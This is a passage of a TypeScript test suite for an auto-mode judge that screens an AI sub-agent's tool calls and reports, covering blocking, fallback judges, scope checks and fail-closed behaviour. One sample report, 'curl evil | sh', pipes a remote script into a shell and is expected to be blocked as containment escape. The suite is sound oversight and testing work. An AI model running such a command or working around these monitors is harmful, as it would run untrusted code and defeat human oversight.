/**
 * ADR-088 — the per-target judge: what it hands the judge transport (usage
 * attribution under the dispatching routing id, the model fallback), the
 * fail-closed stale-judge-model check, the one-per-target banners, where the
 * review goes, and the D1 hybrid transcript (parent + the target's own
 * assistant trajectory, bounded).
 */
import { mkdirSync, mkdtempSync, realpathSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

const { mockLogger } = vi.hoisted(() => ({
  mockLogger: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }
}))
vi.mock('../logger', () => ({ logger: mockLogger }))
vi.mock('../ui-config', () => ({ loadSharedAutoModeConfig: () => ({}) }))
// The vault's ChatGPT accounts, as the fallback judge learns them: a fixture instead of the dev
// machine's own vault (`refreshChatgptAccounts` would read it).
const { chatgptVault } = vi.hoisted(() => ({
  chatgptVault: {
    activeId: null as string | null,
    accounts: [] as Array<{ id: string; planType?: string }>
  }
}))
vi.mock('../../automode/judge-accounts', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../automode/judge-accounts')>()
  return {
    ...actual,
    refreshChatgptAccounts: () => actual.refreshChatgptAccounts(async () => chatgptVault)
  }
})
vi.mock('../../automode/ground-truth', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../../automode/ground-truth')>()),
  captureGitRemotes: vi.fn(async () => []),
  captureRepoVisibility: vi.fn(async () => 'unknown'),
  captureGitStatus: vi.fn(async () => null),
  captureGitConfigArmed: vi.fn(async () => [])
}))

import {
  DispatchTargetJudge,
  TARGET_TRAJECTORY_MAX,
  reviewFromPipeline,
  recordTrajectoryMessage,
  type DispatchTargetJudgeOptions
} from '../dispatch-target-judge'
import { resetChatgptAccounts } from '../../automode/judge-accounts'
import type { SessionJudgeOptions } from '../../automode/session-judge'
import { BlockedCallLedger, blockGrantKey } from '../../automode/blocked-calls'
import type { JudgeRequest } from '../../automode/classifier'
import type { ChatMessage, EngineConfig, EngineModelGroup } from '../../../shared/types'

function msg(id: string, role: ChatMessage['role'], content: ChatMessage['content']): ChatMessage {
  return { id, role, content, timestamp: 0 }
}

function setup(
  autoMode: EngineConfig['autoMode'] = { twoStageMode: 'fast' },
  over: Partial<DispatchTargetJudgeOptions> = {}
) {
  const emit = vi.fn()
  const transportOpts: SessionJudgeOptions[] = []
  const requests: JudgeRequest[] = []
  const replies: Array<string | Error> = []
  const trajectory = new Map<string, ChatMessage>()
  const judge = new DispatchTargetJudge({
    engine: 'opencode',
    cwd: '/repo',
    routingId: 'parent-routing',
    sessionId: () => 'target-session',
    model: () => 'anthropic/target-model',
    emit: () => emit,
    messages: () => [msg('p1', 'user', [{ type: 'text', text: 'please clean the build dir' }])],
    trajectory: () => trajectory.values(),
    subagent: () => ({ type: 'dispatch:opencode', prompt: 'remove build/ and rebuild' }),
    loadEngineConfig: () => ({ autoMode }) as EngineConfig,
    peekModels: () => null,
    makeTransport: (opts) => {
      transportOpts.push(opts)
      return async (req) => {
        requests.push(req)
        const next = replies.shift()
        if (next instanceof Error) throw next
        return next ?? '<block>no</block>'
      }
    },
    ...over
  })
  const call = {
    currentMode: () => 'auto',
    honoursWorkdir: true,
    permissions: () => ({ allow: [], ask: [], deny: [], additionalDirectories: [] })
  }
  return { judge, emit, transportOpts, requests, replies, trajectory, call }
}

const bash = { toolUseId: 'oc-call-7', toolName: 'bash', input: { command: 'rm -rf build' } }

beforeEach(() => vi.clearAllMocks())

describe('DispatchTargetJudge', () => {
  it('builds the transport under the dispatching routing id, with the target session id', async () => {
    const { judge, call, transportOpts } = setup()
    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })
    expect(transportOpts).toHaveLength(1)
    const opts = transportOpts[0]
    expect(opts.engine).toBe('opencode')
    expect(opts.routingId).toBe('parent-routing')
    expect(opts.sessionId()).toBe('target-session')
    // No judgeModel configured → the target's own model.
    expect(opts.modelValue()).toBe('anthropic/target-model')
  })

  it("ADR-091 part 6: the dispatching session's grant clears the target's exact call once, in its own cwd only", async () => {
    const ledger = new BlockedCallLedger(() => {})
    const review = {
      type: 'tool_review' as const,
      toolUseId: 'x',
      reviewId: 'r',
      reviewer: 'auto-mode' as const,
      decision: 'denied' as const
    }
    // Approved in the TARGET's cwd: the grant for this target's call.
    ledger.record(
      'x',
      { ...bash, review, grantKey: blockGrantKey('opencode', 'bash', bash.input, '/repo', true) },
      false
    )
    ledger.approve('x')
    const { judge, call, requests } = setup(undefined, { blockedCalls: () => ledger })
    // Same command with a workdir elsewhere: another action — judged.
    await judge.judge({ ...bash, input: { ...bash.input, workdir: '/elsewhere' } }, call)
    expect(requests).toHaveLength(1)
    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })
    expect(requests).toHaveLength(1)
    await judge.judge(bash, call)
    expect(requests).toHaveLength(2)
  })

  it('modelValue is the TARGET engine’s autoMode.judgeModel when set', async () => {
    const { judge, call, transportOpts } = setup({ twoStageMode: 'fast', judgeModel: 'x/judge' })
    await judge.judge(bash, call)
    expect(transportOpts[0].modelValue()).toBe('x/judge')
  })

  it('autoModeActive follows the target engine’s switch', () => {
    expect(setup().judge.autoModeActive('auto')).toBe(true)
    expect(setup().judge.autoModeActive('full')).toBe(true)
    expect(setup().judge.autoModeActive('default')).toBe(false)
    expect(setup({ enabled: false }).judge.autoModeActive('auto')).toBe(false)
  })

  it('a stale configured judge model → human, zero judge calls, ONE banner per target', async () => {
    const groups: EngineModelGroup[] = [
      {
        engineId: 'opencode',
        vendorId: 'anthropic' as EngineModelGroup['vendorId'],
        vendorName: 'A',
        models: [{ value: 'x/other', displayName: 'other', description: '' }]
      }
    ]
    const { judge, call, emit, requests } = setup(
      { twoStageMode: 'fast', judgeModel: 'x/gone' },
      { peekModels: () => groups }
    )
    const stale = {
      kind: 'human',
      reason:
        'Auto-mode judge unavailable: the configured judge model is no longer available. Review this call yourself.'
    }
    expect(await judge.judge(bash, call)).toEqual(stale)
    expect(await judge.judge(bash, call)).toEqual(stale)
    expect(requests).toHaveLength(0)
    const errors = emit.mock.calls.filter((c) => c[0] === 'session:error')
    expect(errors).toHaveLength(1)
    expect(errors[0][1]).toContain('Auto-mode judge model "x/gone" is no longer available')
    expect(errors[0][1]).toContain('Auto-mode judge (opencode)')
  })

  it('a listed or uncatalogued judge model is available', () => {
    expect(setup({ judgeModel: 'x/j' }).judge.judgeAvailable()).toBe(true)
    const listed = setup(
      { judgeModel: 'x/j' },
      {
        peekModels: () => [
          {
            engineId: 'opencode',
            vendorId: 'anthropic' as EngineModelGroup['vendorId'],
            vendorName: 'A',
            models: [{ value: 'x/j', displayName: 'j', description: '' }]
          }
        ]
      }
    )
    expect(listed.judge.judgeAvailable()).toBe(true)
  })

  it('a route-unavailable judge says so ONCE per target', async () => {
    const { judge, call, emit, transportOpts } = setup()
    await judge.judge(bash, call)
    transportOpts[0].onUnavailable('no route')
    transportOpts[0].onUnavailable('no route')
    const errors = emit.mock.calls.filter((c) => c[0] === 'session:error')
    expect(errors).toHaveLength(1)
    expect(errors[0][1]).toContain('no route')
  })

  it('a judge call that fails → human WITH the reason, and the one banner says why (not again)', async () => {
    const message =
      'ChatGPT · gpt-6-luna: HTTP 429 (resets at 2026-10-28T13:34:58.000Z): {"error":{"type":"usage_limit_reached"}}'
    const { judge, call, emit, transportOpts, replies } = setup()
    replies.push(new Error(message), new Error(message))
    const unavailable = {
      kind: 'human',
      reason:
        'Auto-mode judge unavailable: ChatGPT · gpt-6-luna: HTTP 429 (resets at 2026-10-28T13:34:58.000Z). Review this call yourself.'
    }
    expect(await judge.judge(bash, call)).toEqual(unavailable)
    // What the session transport reports for that failed call (see session-judge.test.ts).
    const report = 'ChatGPT · gpt-6-luna: HTTP 429 (resets at 2026-10-28T13:34:58.000Z).'
    transportOpts[0].onUnavailable(report)
    expect(await judge.judge(bash, call)).toEqual(unavailable)
    transportOpts[1].onUnavailable(report)

    const errors = emit.mock.calls.filter((c) => c[0] === 'session:error')
    expect(errors).toHaveLength(1)
    expect(errors[0][1]).toContain(`Auto-mode can't judge here: ${report} Every gated action`)
  })

  it('emits the review under emit() with the NESTED tool id', async () => {
    const { judge, call, emit } = setup()
    await judge.judge(bash, call)
    const reviews = emit.mock.calls.filter((c) => c[0] === 'session:tool-review')
    expect(reviews).toHaveLength(1)
    expect(reviews[0][1]).toMatchObject({
      toolUseId: 'oc-call-7',
      review: { toolUseId: 'oc-call-7', reviewer: 'auto-mode', decision: 'approved' }
    })
  })

  it('a block holds (ADR-091 §3); the call is annotated only once the hold is kept', async () => {
    const { judge, call, replies, requests, trajectory } = setup()
    recordTrajectoryMessage(
      trajectory,
      msg('a1', 'assistant', [
        { type: 'tool_use', toolUseId: 'oc-call-7', toolName: 'bash', toolInput: bash.input }
      ])
    )
    replies.push(
      '<block>yes</block><reason>destroys the build</reason>',
      // The confirmation sample (decision 3) must block too.
      '<block>yes</block><reason>destroys the build</reason>'
    )
    expect(await judge.judge(bash, call)).toEqual({
      kind: 'hold',
      reason: 'Auto mode blocked: destroys the build',
      // The review it sent rides along (ADR-091 part 6).
      review: expect.objectContaining({ toolUseId: 'oc-call-7', decision: 'denied' })
    })
    // Still held: nothing refused it yet.
    await judge.judge({ ...bash, toolUseId: 'oc-call-8' }, call)
    // requests[0..1] are the first judgement's two samples.
    expect(requests[2].user).not.toContain('automode-blocked')
    // Kept (the dispatcher's resolveApproval records it).
    judge.recordOutcome('oc-call-7', 'automode-blocked')
    await judge.judge({ ...bash, toolUseId: 'oc-call-9' }, call)
    expect(requests[3].user).toContain('automode-blocked')
  })

  it('an approved hold resets the denial streak — the next block holds instead of hitting the cap', async () => {
    const { judge, call, replies } = setup()
    // Two samples per judgement (decision 3).
    const yes = '<block>yes</block>'
    replies.push(yes, yes, yes, yes, yes, yes)
    expect((await judge.judge(bash, call)).kind).toBe('hold')
    expect((await judge.judge(bash, call)).kind).toBe('hold')
    judge.recordHoldApproved()
    // Without the reset this would be the 3rd consecutive block → the human.
    expect((await judge.judge(bash, call)).kind).toBe('hold')
  })

  it('D1: the judge reads the parent transcript then the target’s own assistant trajectory — never a target user line', async () => {
    const { judge, call, requests, trajectory } = setup()
    // A user-role target message (the dispatch prompt as the target saw it) never enters.
    recordTrajectoryMessage(
      trajectory,
      msg('t0', 'user', [{ type: 'text', text: 'remove build/ and rebuild' }])
    )
    recordTrajectoryMessage(
      trajectory,
      msg('t1', 'assistant', [
        {
          type: 'tool_use',
          toolUseId: 'earlier',
          toolName: 'bash',
          toolInput: { command: 'ls build' }
        }
      ])
    )
    expect(trajectory.size).toBe(1)
    await judge.judge(bash, call)
    const user = requests[0].user
    expect(user).toContain('User: please clean the build dir')
    expect(user).toContain('ls build')
    expect(user).not.toMatch(/User: remove build\/ and rebuild/)
    // The prompt still reaches the judge — as the subagent header's task.
    expect(user).toContain('"dispatch:opencode" subagent')
    expect(judge.judgeMessages().map((m) => m.id)).toEqual(['p1', 't1'])
  })

  it('ADR-091 §4: parent, queued user turns and the trajectory merge in time order (stable on ties)', async () => {
    const at = (m: ChatMessage, timestamp: number): ChatMessage => ({ ...m, timestamp })
    const { judge, call, requests, trajectory } = setup(undefined, {
      messages: () => [
        at(msg('p1', 'user', [{ type: 'text', text: 'set up the VM' }]), 100),
        at(msg('p2', 'user', [{ type: 'text', text: 'go ahead, push it' }]), 300)
      ],
      queuedTurns: () => [
        at(msg('q1', 'user', [{ type: 'text', text: 'yes, the queued go-ahead' }]), 250)
      ]
    })
    // The child's blocked call (200) precedes the user's later consent (250, 300);
    // a trajectory message tied with a parent one (100) stays after it.
    recordTrajectoryMessage(
      trajectory,
      at(
        msg('t1', 'assistant', [
          { type: 'tool_use', toolUseId: 'blocked', toolName: 'bash', toolInput: bash.input }
        ]),
        200
      )
    )
    recordTrajectoryMessage(trajectory, at(msg('t0', 'assistant', []), 100))
    expect(judge.judgeMessages().map((m) => m.id)).toEqual(['p1', 't0', 't1', 'q1', 'p2'])
    await judge.judge(bash, call)
    const user = requests[0].user
    expect(user.indexOf('rm -rf build')).toBeLessThan(
      user.indexOf('User: yes, the queued go-ahead')
    )
  })
})

describe('DispatchTargetJudge — the target’s scope (additional directories via permissions)', () => {
  // Real directories (a redirect is only cleared into a directory that exists), on NO temp root:
  // the OS temp dir is always in scope for a redirect, so the host's temp variables are pointed
  // at a directory of their own for these tests.
  let base: string
  let scratchTmp: string
  let repo: string
  let parent: string
  let extra: string
  let elsewhere: string
  const dir = (name: string): string => {
    const d = join(base, name)
    mkdirSync(d, { recursive: true })
    return realpathSync.native(d)
  }
  beforeAll(() => {
    // Not under `/tmp`: on Linux that is the OS temp dir AND a fixed redirect temp root that
    // stubbing TMPDIR cannot remove, so "out of scope without the grant" could never hold there.
    // (The repo checkout is no option either: a worktree lives under `.claude/`, a protected name.)
    const scratchRoot = tmpdir().startsWith('/tmp') ? '/var/tmp' : tmpdir()
    base = mkdtempSync(join(scratchRoot, 'xeng-ctxdirs-'))
    repo = dir('target-worktree')
    parent = dir('parent-repo')
    extra = dir('shared-extra')
    elsewhere = dir('elsewhere')
    scratchTmp = mkdtempSync(join(tmpdir(), 'xeng-ctxdirs-tmp-'))
    for (const name of ['TMPDIR', 'TEMP', 'TMP']) vi.stubEnv(name, scratchTmp)
  })
  afterAll(() => {
    vi.unstubAllEnvs()
    rmSync(base, { recursive: true, force: true })
    rmSync(scratchTmp, { recursive: true, force: true })
  })

  /** A judge whose target runs in `repo`, its parent in `parent`. */
  function ctxSetup(dirs: () => string[] = () => []) {
    const { call, ...rest } = setup({ twoStageMode: 'fast' }, { cwd: repo })
    return {
      ...rest,
      // The target's scope reaches the judge only as the rules' additional directories
      // (`CrossEngineDispatcher.targetRules`): the one channel the gates, the redirect
      // measurement and the Environment text all read.
      call: {
        ...call,
        permissions: () => ({ allow: [], ask: [], deny: [], additionalDirectories: dirs() })
      }
    }
  }
  const slashed = (p: string): string => p.replaceAll('\\', '/')
  const redirectInto = (target: string) => ({
    toolUseId: 'call-redirect',
    toolName: 'bash',
    input: { command: `echo hi > "${slashed(target)}/out.txt"` }
  })
  const readOf = (target: string) => ({
    toolUseId: 'call-read',
    toolName: 'bash',
    input: { command: `cat "${slashed(target)}/notes.txt"` }
  })
  const dirsLine = /count as local\): (.*)/
  const promptOf = (r: JudgeRequest): string => `${r.system}
${r.user}`

  it('the Environment lists the parent directory and an additional one as local', async () => {
    const { judge, call, requests } = ctxSetup(() => [parent, extra])
    await judge.judge(bash, call)
    expect(dirsLine.exec(promptOf(requests[0]))?.[1]).toBe(`${parent}, ${extra}`)
  })

  it('reads the scope fresh per call', async () => {
    let dirs = [extra]
    const { judge, call, requests } = ctxSetup(() => dirs)
    await judge.judge(bash, call)
    dirs = [extra, parent]
    await judge.judge({ ...bash, toolUseId: 'second' }, call)
    const seen = requests.map((r) => dirsLine.exec(promptOf(r))?.[1])
    expect(seen).toEqual([extra, `${extra}, ${parent}`])
  })

  it('no scope directories: the Environment is what it was (no additional-directories line)', async () => {
    const { judge, call, requests } = ctxSetup()
    await judge.judge(bash, call)
    expect(promptOf(requests[0])).not.toMatch(dirsLine)
  })

  it('a redirect into an additional directory is in scope; without it, it is not', async () => {
    const withDirs = ctxSetup(() => [extra])
    await withDirs.judge.judge(redirectInto(extra), withDirs.call)
    expect(withDirs.requests[0].user).toContain('"allInScope":true')

    const without = ctxSetup()
    await without.judge.judge(redirectInto(extra), without.call)
    expect(without.requests[0].user).toContain('"allInScope":false')
  })

  it('a redirect into the parent directory is in scope when the target runs elsewhere', async () => {
    const { judge, call, requests } = ctxSetup(() => [parent])
    await judge.judge(redirectInto(parent), call)
    expect(requests[0].user).toContain('"allInScope":true')
    await judge.judge(redirectInto(elsewhere), call)
    expect(requests[1].user).toContain('"allInScope":false')
  })

  it('B1: the read-only gate allows a read under a scope directory without a judge call', async () => {
    const { judge, call, requests } = ctxSetup(() => [extra])
    expect(await judge.judge(readOf(extra), call)).toEqual({ kind: 'allow' })
    expect(requests).toHaveLength(0)
  })

  it('B1: the same read outside every scope root still goes to the judge', async () => {
    const { judge, call, requests } = ctxSetup(() => [extra, parent])
    expect(await judge.judge(readOf(elsewhere), call)).toEqual({ kind: 'allow' })
    expect(requests).toHaveLength(1)
  })

  it('the hand-back review is told the scope directories too', async () => {
    const { judge, call, requests } = ctxSetup(() => [parent, extra])
    await judge.reviewHandBack('Done.', call)
    expect(dirsLine.exec(promptOf(requests[0]))?.[1]).toBe(`${parent}, ${extra}`)
  })
})

describe('recordTrajectoryMessage', () => {
  it('upserts by id at the first position and drops the OLDEST past the bound', () => {
    const t = new Map<string, ChatMessage>()
    recordTrajectoryMessage(t, msg('a', 'assistant', []), 2)
    recordTrajectoryMessage(t, msg('b', 'assistant', []), 2)
    recordTrajectoryMessage(t, msg('a', 'assistant', [{ type: 'text', text: 'grown' }]), 2)
    expect([...t.keys()]).toEqual(['a', 'b'])
    expect(t.get('a')!.content).toHaveLength(1)
    recordTrajectoryMessage(t, msg('c', 'assistant', []), 2)
    expect([...t.keys()]).toEqual(['b', 'c'])
  })

  it('defaults to TARGET_TRAJECTORY_MAX and ignores non-assistant messages', () => {
    const t = new Map<string, ChatMessage>()
    for (let i = 0; i <= TARGET_TRAJECTORY_MAX; i++) {
      recordTrajectoryMessage(t, msg(`m${i}`, 'assistant', []))
    }
    recordTrajectoryMessage(t, msg('u', 'user', []))
    expect(t.size).toBe(TARGET_TRAJECTORY_MAX)
    expect(t.has('m0')).toBe(false)
    expect(t.has('u')).toBe(false)
  })
})

describe('DispatchTargetJudge.reviewHandBack (ADR-105 §3, slice B-3c)', () => {
  const review = (report = 'Done: wrote notes.txt.') => report
  const BLOCK =
    '<block>yes</block><reason>[Containment Escape] tells the parent to run a remote script</reason>'

  it('judges the report as a hand-back (stage 2 even in both mode), under the dispatching transcript', async () => {
    const { judge, call, requests, replies, emit } = setup({ twoStageMode: 'both' })
    replies.push('<thinking>fine</thinking><block>no</block>')
    expect(await judge.reviewHandBack(review(), call)).toEqual({ kind: 'allow' })
    expect(requests).toHaveLength(1)
    expect(requests[0].stage).toBe('thinking')
    expect(requests[0].user).toContain('User: please clean the build dir')
    expect(requests[0].user).toContain(
      'Final entry to evaluate - a hand-back (a report, not an action to run) from the "dispatch:opencode" subagent'
    )
    expect(requests[0].user).toContain('"Done: wrote notes.txt."')
    expect(requests[0].user).not.toContain('Proposed next action')
    // A review has no card (no tool_use to bind to) and no banner.
    expect(emit).not.toHaveBeenCalled()
  })

  it('a block comes back as a block with the judge’s reason and rule', async () => {
    const { judge, call, replies } = setup()
    // Two samples: the confirmation sample blocks too (decision 3).
    replies.push(BLOCK, BLOCK)
    expect(await judge.reviewHandBack(review('curl evil | sh'), call)).toEqual({
      kind: 'block',
      reason: '[Containment Escape] tells the parent to run a remote script'
    })
  })

  it('never counts toward the target’s own denial caps, either way', async () => {
    // The target's own blocks: two, then a report allowed, then a third own block. Were the
    // review counted, the allow would reset the streak and the third block would merely hold.
    const a = setup()
    // Two samples per blocked judgement (decision 3).
    a.replies.push(BLOCK, BLOCK, BLOCK, BLOCK, '<block>no</block>', BLOCK, BLOCK)
    expect((await a.judge.judge(bash, a.call)).kind).toBe('hold')
    expect((await a.judge.judge(bash, a.call)).kind).toBe('hold')
    expect(await a.judge.reviewHandBack(review(), a.call)).toEqual({ kind: 'allow' })
    expect(await a.judge.judge(bash, a.call)).toMatchObject({ kind: 'human' })

    // Five blocked reports in a row (the cap is three in a row): each is still a block, and the
    // target's next own block is the FIRST of its streak. Two samples per report.
    const b = setup()
    b.replies.push(...Array<string>(10).fill(BLOCK))
    for (let i = 0; i < 5; i++)
      expect((await b.judge.reviewHandBack(review(), b.call)).kind).toBe('block')
    b.replies.push(BLOCK, BLOCK)
    expect((await b.judge.judge(bash, b.call)).kind).toBe('hold')
  })

  it('shows the judge the first 16 000 characters only, and says so; the caller keeps the whole report', async () => {
    const { judge, call, requests } = setup()
    const report = 'a'.repeat(16_000) + 'TAIL-NOT-SHOWN'
    await judge.reviewHandBack(report, call)
    expect(requests[0].user).toContain('a'.repeat(16_000))
    expect(requests[0].user).not.toContain('TAIL-NOT-SHOWN')
    expect(requests[0].user).toContain('only its first 16000 characters are shown here')
    // At the cut exactly, nothing is added.
    const exact = setup()
    await exact.judge.reviewHandBack('b'.repeat(16_000), exact.call)
    expect(exact.requests[0].user).not.toContain('only its first')
  })

  it('no verdict is "could not review": a transport error, a route with none, an unreadable reply', async () => {
    const down = setup()
    down.replies.push(new Error('HTTP 503'))
    expect(await down.judge.reviewHandBack(review(), down.call)).toEqual({
      kind: 'unavailable',
      why: 'HTTP 503'
    })

    // The route resolver's sentence is the cause, and it is NOT the target's one banner.
    const emit = vi.fn()
    const noRoute = setup(undefined, {
      emit: () => emit,
      makeTransport: (opts) => async () => {
        opts.onUnavailable('"anthropic" is set up inside opencode, not in ClaudeUI.')
        throw new Error('route unavailable')
      }
    })
    expect(await noRoute.judge.reviewHandBack(review(), noRoute.call)).toEqual({
      kind: 'unavailable',
      why: '"anthropic" is set up inside opencode, not in ClaudeUI.'
    })
    expect(emit).not.toHaveBeenCalled()

    const garbled = setup()
    garbled.replies.push('I cannot comply with that.')
    expect(await garbled.judge.reviewHandBack(review(), garbled.call)).toEqual({
      kind: 'unavailable',
      why: "the reviewer's answer could not be read"
    })
  })

  it('auto mode left while it was judged → could not review (the verdict is stale authority)', async () => {
    let mode = 'auto'
    const { judge, call } = setup(undefined, {
      makeTransport: () => async () => {
        mode = 'default'
        return BLOCK
      }
    })
    expect(await judge.reviewHandBack(review(), { ...call, currentMode: () => mode })).toEqual({
      kind: 'unavailable',
      why: 'auto mode was switched off while it was reviewed'
    })
  })

  it('a run stopped meanwhile cancels the verdict; a stale judge model is named; it never throws', async () => {
    const stopped = setup()
    stopped.replies.push(BLOCK)
    expect(
      await stopped.judge.reviewHandBack(review(), { ...stopped.call, stillPending: () => false })
    ).toEqual({ kind: 'unavailable', why: 'the review was cancelled' })

    const groups: EngineModelGroup[] = [
      {
        engineId: 'opencode',
        vendorId: 'anthropic' as EngineModelGroup['vendorId'],
        vendorName: 'A',
        models: [{ value: 'x/other', displayName: 'o', description: '' }]
      }
    ]
    const stale = setup(
      { twoStageMode: 'fast', judgeModel: 'x/gone' },
      { peekModels: () => groups }
    )
    expect(await stale.judge.reviewHandBack(review(), stale.call)).toEqual({
      kind: 'unavailable',
      why: 'the configured judge model is no longer available'
    })

    const broken = setup(undefined, {
      messages: () => {
        throw new Error('transcript unreadable')
      }
    })
    expect(await broken.judge.reviewHandBack(review(), broken.call)).toMatchObject({
      kind: 'unavailable'
    })
  })

  it('a Codex target’s report goes through pi’s route on the target’s own model, under the Codex engine’s switches', async () => {
    const asked: string[] = []
    const { judge, call, transportOpts, replies } = setup(
      { twoStageMode: 'fast', judgeModel: 'someone-elses/judge', enabled: true },
      {
        engine: 'pi',
        configEngine: 'codex',
        fixedModel: () => 'gpt-5.4',
        model: () => 'gpt-5.4',
        sessionId: () => null,
        loadEngineConfig: (id: string) => {
          asked.push(id)
          return {
            autoMode: { twoStageMode: 'fast', judgeModel: 'someone-elses/judge' }
          } as EngineConfig
        }
      }
    )
    replies.push('<block>no</block>')
    expect(await judge.reviewHandBack(review(), call)).toEqual({ kind: 'allow' })
    expect(asked).toEqual(['codex'])
    expect(transportOpts[0].engine).toBe('pi')
    // The target's own model — never another engine's configured judge model.
    expect(transportOpts[0].modelValue()).toBe('gpt-5.4')
    // No Codex thread id is passed off as a pi session on the usage row.
    expect(transportOpts[0].sessionId()).toBeNull()
  })

  it('the caller’s signal reaches the transport request: aborting it aborts the request in flight', async () => {
    const stop = new AbortController()
    const { judge, call, requests, replies } = setup({ twoStageMode: 'both' })
    replies.push('<block>no</block>')
    await judge.reviewHandBack(review(), { ...call, signal: stop.signal })
    const sent = requests[0].signal!
    expect(sent.aborted).toBe(false)
    stop.abort()
    expect(sent.aborted).toBe(true)
  })

  it('without a caller signal the request carries the stage’s signal untouched', async () => {
    const { judge, call, requests, replies } = setup({ twoStageMode: 'both' })
    replies.push('<block>no</block>')
    await judge.reviewHandBack(review(), call)
    expect(requests[0].signal).toBeInstanceOf(AbortSignal)
    expect(requests[0].signal!.aborted).toBe(false)
  })
})

describe('reviewFromPipeline', () => {
  it('maps every pipeline detail to a review', () => {
    expect(
      reviewFromPipeline({ kind: 'verdict', result: { block: false, stage: 'fast' } })
    ).toEqual({
      kind: 'allow'
    })
    expect(
      reviewFromPipeline({
        kind: 'verdict',
        result: { block: true, stage: 'thinking', reason: 'no', category: 'git_destructive' }
      })
    ).toMatchObject({ kind: 'block', reason: expect.stringContaining('no') })
    // A capped block still stands as a block (the throwaway tracker never caps, but the mapping holds).
    expect(
      reviewFromPipeline({
        kind: 'verdict',
        result: { block: true, stage: 'thinking', reason: 'no' },
        capped: 'cap'
      })
    ).toEqual({ kind: 'block', reason: 'no' })
    expect(reviewFromPipeline({ kind: 'none' })).toEqual({
      kind: 'unavailable',
      why: 'the review was cancelled'
    })
    expect(reviewFromPipeline({ kind: 'unavailable', cause: 'judge' })).toEqual({
      kind: 'unavailable',
      why: 'the reviewer gave no answer'
    })
  })
})

describe('DispatchTargetJudge fallback judge (autoMode.fallbackJudgeModel)', () => {
  const FALLBACK = 'x/fallback'
  const PRIMARY = 'anthropic/target-model'
  const DOWN = 'ChatGPT · gpt-6-luna: HTTP 429 (resets at 2026-10-28T13:34:58.000Z).'
  const FALLBACK_DOWN = 'x · fallback: HTTP 503.'

  /**
   * Transports scripted per judge model, shaped like the real one: a model with no replies left
   * reports why through `onUnavailable` and then throws (`makeSessionJudgeTransport`).
   */
  function scripted(replies: Record<string, string[]>, reasons: Record<string, string> = {}) {
    const asked: string[] = []
    const built: SessionJudgeOptions[] = []
    const makeTransport = (opts: SessionJudgeOptions) => {
      built.push(opts)
      return async () => {
        const model = opts.modelValue()
        asked.push(model)
        const next = replies[model]?.shift()
        if (next === undefined) {
          opts.onUnavailable(reasons[model] ?? `${model}: down.`)
          throw new Error(`${model} down`)
        }
        return next
      }
    }
    return { asked, built, makeTransport }
  }

  const groups = (...values: string[]): EngineModelGroup[] => [
    {
      engineId: 'opencode',
      vendorId: 'anthropic' as EngineModelGroup['vendorId'],
      vendorName: 'A',
      models: values.map((value) => ({ value, displayName: value, description: '' }))
    }
  ]
  const errors = (emit: ReturnType<typeof vi.fn>): string[] =>
    emit.mock.calls.filter((c) => c[0] === 'session:error').map((c) => c[1] as string)
  const fallbackBanner = (): string =>
    `Auto-mode judge unavailable: ${DOWN} ${FALLBACK} is judging instead until it recovers. ` +
    'Change the judge models in Settings › Sessions & autonomy › Auto-mode judge (opencode).'

  it('the primary cannot answer: the fallback judges the action, and the ONE banner says so', async () => {
    const { asked, makeTransport } = scripted(
      { [PRIMARY]: [], [FALLBACK]: ['<block>no</block>', '<block>no</block>'] },
      { [PRIMARY]: DOWN }
    )
    const { judge, call, emit } = setup(
      { twoStageMode: 'fast', fallbackJudgeModel: ` ${FALLBACK} ` },
      { makeTransport }
    )

    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })
    expect(await judge.judge({ ...bash, toolUseId: 'oc-call-8' }, call)).toEqual({ kind: 'allow' })

    // Each action is asked of the primary first, then of the trimmed fallback model.
    expect(asked).toEqual([PRIMARY, FALLBACK, PRIMARY, FALLBACK])
    expect(errors(emit)).toEqual([fallbackBanner()])
  })

  it('the fallback transport carries the target session, the dispatching routing id and the fallback model', async () => {
    const { built, makeTransport } = scripted({ [PRIMARY]: [], [FALLBACK]: ['<block>no</block>'] })
    const { judge, call } = setup(
      { twoStageMode: 'fast', fallbackJudgeModel: FALLBACK },
      { makeTransport }
    )

    await judge.judge(bash, call)

    expect(built.map((o) => o.modelValue())).toEqual([PRIMARY, FALLBACK])
    const fallback = built[1]
    expect(fallback.engine).toBe('opencode')
    expect(fallback.routingId).toBe('parent-routing')
    expect(fallback.sessionId()).toBe('target-session')
  })

  it('a primary that answers never builds the fallback', async () => {
    const { built, makeTransport } = scripted({ [PRIMARY]: ['<block>no</block>'] })
    const { judge, call } = setup(
      { twoStageMode: 'fast', fallbackJudgeModel: FALLBACK },
      { makeTransport }
    )

    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })
    expect(built.map((o) => o.modelValue())).toEqual([PRIMARY])
  })

  it('both judges unavailable: the human decides, with one banner per judge', async () => {
    const { makeTransport } = scripted({}, { [PRIMARY]: DOWN, [FALLBACK]: FALLBACK_DOWN })
    const { judge, call, emit } = setup(
      { twoStageMode: 'fast', fallbackJudgeModel: FALLBACK },
      { makeTransport }
    )

    expect((await judge.judge(bash, call)).kind).toBe('human')
    expect((await judge.judge({ ...bash, toolUseId: 'oc-call-8' }, call)).kind).toBe('human')

    expect(errors(emit)).toEqual([
      fallbackBanner(),
      `Auto-mode can't judge here: fallback ${FALLBACK}: ${FALLBACK_DOWN} Every gated action will ` +
        'ask you instead. Change the judge model in Settings › Sessions & autonomy › Auto-mode judge (opencode).'
    ])
  })

  it('no fallback is in effect when it is blank, equals the effective primary, or the judge is fixed', async () => {
    const cases: Array<
      [NonNullable<EngineConfig['autoMode']>, Partial<DispatchTargetJudgeOptions>]
    > = [
      [{ twoStageMode: 'fast', fallbackJudgeModel: '  ' }, {}],
      // No judgeModel: the primary is the target's own model.
      [{ twoStageMode: 'fast', fallbackJudgeModel: PRIMARY }, {}],
      [
        { twoStageMode: 'fast', fallbackJudgeModel: FALLBACK },
        { engine: 'pi', configEngine: 'codex', fixedModel: () => 'gpt-5.4' }
      ]
    ]
    for (const [autoMode, over] of cases) {
      const { asked, makeTransport } = scripted({}, {})
      const { judge, call, emit } = setup(autoMode, { ...over, makeTransport })
